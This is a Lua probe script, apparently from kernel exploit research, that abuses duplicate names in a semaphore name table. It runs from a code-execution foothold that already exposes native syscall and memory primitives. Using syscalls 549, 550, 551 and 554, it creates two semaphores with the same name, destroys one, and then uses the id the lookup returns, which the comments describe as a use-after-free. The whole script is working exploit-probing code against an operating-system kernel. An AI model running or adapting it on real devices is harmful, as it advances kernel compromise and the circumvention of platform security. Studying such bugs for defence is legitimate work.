-- CRASH_CLASS: MODERATE
-- PROBE 869a: duplicate names in the semaphore name table
--
-- 549 with flags & 0x100 registers the name through 0x994870(name, obj, 0x120);
-- 550 unregisters through 0x994a10 only when [obj+0x45] & 1.  825a showed a
-- create with a duplicate name succeeding while 551(name) kept resolving the
-- OLD object, so the registry and the object are not 1:1.  If destroying the
-- duplicate unregisters the survivor's entry, the registry either loses a live
-- name or keeps a dangling one; a later lookup would then hand back an id whose
-- object is gone.
print("=== PROBE 869a: duplicate semaphore names ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function make_syscall(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=to_num(a) return uint64(string.format("0x%08X%08X", math.floor(a/4294967296), a%4294967296)) end
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
local function nm(s) local p=memory.alloc(0x40) for i=0,0x3F do memory.write_byte(p+i,0) end for i=1,#s do memory.write_byte(p+i-1,string.byte(s,i)) end return p end
local function create(name, flags)
    local ok, r = pcall(function() return make_syscall(549)(U(to_num(name)),U(flags),U(0),U(0x1000),U(0),U(0)) end)
    local v = to_num(r)
    if v > 0x7FFFFFFF then v = v - 0x100000000 end
    return ok, v
end
local function lookup(name)
    local ok, r = pcall(function() return make_syscall(551)(U(to_num(name)),U(0),U(0),U(0),U(0),U(0)) end)
    local v = to_num(r); if v > 0x7FFFFFFF then v = v - 0x100000000 end
    return ok, v
end
local function destroy(id)
    local ok, r = pcall(function() return make_syscall(550)(U(id),U(0),U(0),U(0),U(0),U(0)) end)
    return ok, to_num(r)
end
local function sems(name)
    local ok, id = create(name, 0x101)
    return ok, id
end
local N = nm("dupn")
local okA, A = sems(N)
print(string.format("[A] create A(name dupn, 0x101) = %s/%d", tostring(okA), A))
local okB, B = sems(N)
print(string.format("[B] create B(same name)        = %s/%d", tostring(okB), B))
local okL, L = lookup(N)
print(string.format("[C] lookup(dupn) before any destroy = %s/%d  (A=%d B=%d)", tostring(okL), L, A, B))
local okD, D = destroy(B)
print(string.format("[D] destroy B = %s/%d", tostring(okD), D))
local okL2, L2 = lookup(N)
print(string.format("[E] lookup(dupn) after destroy B    = %s/%d  (A still alive=%d)", tostring(okL2), L2, A))
-- use whatever the lookup returns: if it names a freed object this is the UAF
if L2 ~= -1 then
    local okP, P = pcall(function() return make_syscall(554)(U(L2),U(1),U(0),U(0),U(0),U(0)) end)
    print(string.format("[F] 554(lookup-id=%d,1) = %s/%s", L2, tostring(okP), tostring(P)))
end
local okD2, D2 = destroy(A)
print(string.format("[G] destroy A = %s/%d", tostring(okD2), D2))
local okL3, L3 = lookup(N)
print(string.format("[H] lookup(dupn) after destroying both = %s/%d", tostring(okL3), L3))
local okC, C = sems(nm("fresh"))
print(string.format("[Z] health create(fresh) = %s/%d alive-pid=%s", tostring(okC), C,
    tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20)))))
